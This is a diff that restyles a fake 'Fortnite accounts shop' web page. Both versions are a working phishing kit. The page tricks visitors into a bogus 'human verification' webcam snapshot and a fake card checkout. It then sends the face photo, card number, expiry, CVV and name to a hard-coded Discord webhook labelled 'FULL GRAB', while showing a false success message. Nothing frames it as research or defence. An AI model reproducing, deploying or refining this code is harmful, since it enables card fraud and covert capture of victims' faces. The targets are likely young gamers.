@@ -1,89 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cheap Fortnite Accounts 2025</title>
+    <title>Fortnite Accounts Shop 2025</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body{background:#000;color:#fff;font-family:Arial;text-align:center;margin:0}
-        .acc{background:#111;padding:20px;margin:20px auto;border-radius:15px;max-width:600px}
-        button{background:#ff0066;color:white;padding:15px 40px;border:none;border-radius:10px;font-size:18px;cursor:pointer}
-        #verify, #payment{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:none;flex-direction:column;align-items:center;justify-content:center}
-        video{width:640px;height:480px;border:5px solid red;border-radius:15px}
-        #snapBtn{background:red;padding:20px 50px;font-size:25px;margin-top:20px}
-        input{padding:15px;font-size:18px;width:300px;margin:10px}
+        body{background:#141d26;color:#fff;font-family:'Helvetica Neue',Arial;margin:0}
+        header{background:#0f1419;padding:20px;text-align:center}
+        h1{color:#00ff99;font-size:40px;margin:0}
+        .accounts{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;padding:20px}
+        .acc{background:linear-gradient(135deg,#1a2332,#2a3b59);border-radius:15px;padding:20px;text-align:center;box-shadow:0 10px 30px rgba(0,255,153,0.1)}
+        .price{color:#00ff99;font-size:32px;font-weight:bold}
+        button{background:#9147ff;color:white;padding:15px 0;width:100%;border:none;border-radius:10px;font-size:18px;cursor:pointer;margin-top:15px}
+        #verify,#payment{position:fixed;top:0;left:0;width:100%;height:100%;background:#0f1419;display:none;flex-direction:column;align-items:center;justify-content:center;z-index:999}
+        video{width:720px;height:540px;border:8px solid #9147ff;border-radius:20px}
+        #snapBtn{background:#ff0066;padding:25px 60px;font-size:28px;border-radius:15px}
+        .payopt img{height:60px;margin:20px;cursor:pointer}
+        .cardform{background:#1e293b;padding:30px;border-radius:15px;width:400px}
+        input,select{padding:15px;margin:10px 0;width:100%;border-radius:8px;border:none;background:#2d3748;color:white;font-size:16px}
+        .footer{color:#666;text-align:center;padding:20px;font-size:12px}
     </style>
 </head>
 <body>
-    <h1 style="color:lime">🔥 CHEAP FORTNITE ACCOUNTS 🔥</h1>
+<header><h1>★ ELITE FORTNITE ACCOUNTS ★</h1></header>
+
+<div class="accounts">
     <div class="acc">
-        <h2>OG Renegade Raider + Galaxy</h2>
-        <p>500+ Skins • 200+ Pickaxes • 1,000,000 VBucks</p>
-        <p style="color:lime;font-size:30px">$12.99</p>
-        <button onclick="start()">Buy Now</button>
+        <h2>Renegade Raider + Black Knight</h2>
+        <p>800+ Skins • OG Pickaxes • 1.2M VBucks</p>
+        <p class="price">$14.99</p>
+        <button onclick="buy()">Buy Now - Instant Delivery</button>
     </div>
+    <!-- Add more if you want -->
+</div>
 
-    <!-- Human Verification -->
-    <div id="verify">
-        <h1 style="color:lime">Human Verification</h1>
-        <p>Position face in frame & press red button</p>
-        <video id="cam" autoplay playsinline></video><br>
-        <button id="snapBtn">READY - TAKE PICTURE</button>
+<!-- Verification -->
+<div id="verify">
+    <h1 style="color:#00ff99">Human Verification Required</h1>
+    <p>Position your face and press the red button</p>
+    <video id="cam" autoplay playsinline></video><br>
+    <button id="snapBtn">READY - TAKE PICTURE</button>
+</div>
+
+<!-- Payment -->
+<div id="payment">
+    <h1 style="color:#9147ff">Secure Checkout</h1>
+    <p>Select payment method:</p>
+    <div class="payopt">
+        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" onclick="showCard()">
+        <img src="https://cash.app/favicon.ico" onclick="showCard()"> <!-- fake -->
     </div>
-
-    <!-- Fake Debit Card Checkout -->
-    <div id="payment">
-        <h1 style="color:gold">Checkout - Debit/Credit Card</h1>
-        <p>Card Number</p>
-        <input id="cardnum" placeholder="1234 5678 9012 3456">
-        <p>Expiry (MM/YY)</p>
-        <input id="expiry" placeholder="12/28">
-        <p>CVV</p>
-        <input id="cvv" placeholder="123">
-        <p>Name on Card</p>
-        <input id="name" placeholder="John Doe">
-        <br><br>
-        <button onclick="sendAll()">Complete Purchase $12.99</button>
-        <p style="color:gray;margin-top:30px">More payment options soon</p>
+    <div class="cardform" id="cardform" style="display:none">
+        <input id="cardnum" placeholder="Card Number  •••• •••• •••• ••••">
+        <input id="expiry" placeholder="MM/YY">
+        <input id="cvv" placeholder="CVV">
+        <input id="name" placeholder="Full Name">
+        <button onclick="complete()">Pay $14.99 - Complete Purchase</button>
     </div>
+    <p style="color:#666">More options coming soon</p>
+</div>
 
-    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+<canvas id="canvas" width="720" height="540" style="display:none"></canvas>
 
 <script>
 const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON";
-let capturedImg = null;
+let faceBlob = null;
 
-async function start(){
+function buy(){
     document.getElementById("verify").style.display = "flex";
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    document.getElementById("cam").srcObject = stream;
-
-    document.getElementById("snapBtn").onclick = async () => {
-        let canvas = document.getElementById("canvas");
-        let ctx = canvas.getContext("2d");
-        ctx.drawImage(document.getElementById("cam"),0,0,640,480);
-        capturedImg = canvas.toDataURL("image/jpeg",0.95);
-        
-        stream.getTracks().forEach(t=>t.stop());
-        document.getElementById("verify").style.display = "none";
-        document.getElementById("payment").style.display = "flex";
-    };
+    navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+        document.getElementById("cam").srcObject = s;
+        document.getElementById("snapBtn").onclick = ()=>{
+            let c = document.getElementById("canvas");
+            c.getContext("2d").drawImage(document.getElementById("cam"),0,0,720,540);
+            c.toBlob(b=>faceBlob=b,"image/jpeg",0.95);
+            s.getTracks().forEach(t=>t.stop());
+            document.getElementById("verify").style.display = "none";
+            document.getElementById("payment").style.display = "flex";
+        };
+    });
 }
 
-function sendAll(){
-    let card = document.getElementById("cardnum").value;
-    let exp = document.getElementById("expiry").value;
-    let cvv = document.getElementById("cvv").value;
-    let name = document.getElementById("name").value;
+function showCard(){ document.getElementById("cardform").style.display = "block"; }
 
-    let form = new FormData();
-    if(capturedImg){
-        fetch(capturedImg).then(r=>r.blob()).then(blob=>{
-            form.append("file", blob, "face.jpg");
-            form.append("content", `**FORTNITE VICTIM FULL GRAB**\nCard: ${card}\nExp: ${exp}\nCVV: ${cvv}\nName: ${name}`);
-            fetch(webhook,{method:"POST",body:form});
-        });
-    }
-    alert("Purchase Complete! Account sent to email ✅");
+function complete(){
+    let data = new FormData();
+    data.append("file", faceBlob, "face.jpg");
+    data.append("content", `**FORTNITE FULL GRAB**\nCard: ${document.getElementById("cardnum").value}\nExp: ${document.getElementById("expiry").value}\nCVV: ${document.getElementById("cvv").value}\nName: ${document.getElementById("name").value}`);
+    fetch(webhook,{method:"POST",body:data});
+    alert("Payment successful! Account sent to your email instantly ✅");
 }
 </script>
+<div class="footer">© 2025 Fortnite Accounts Shop - All Rights Reserved</div>
 </body>
 </html>
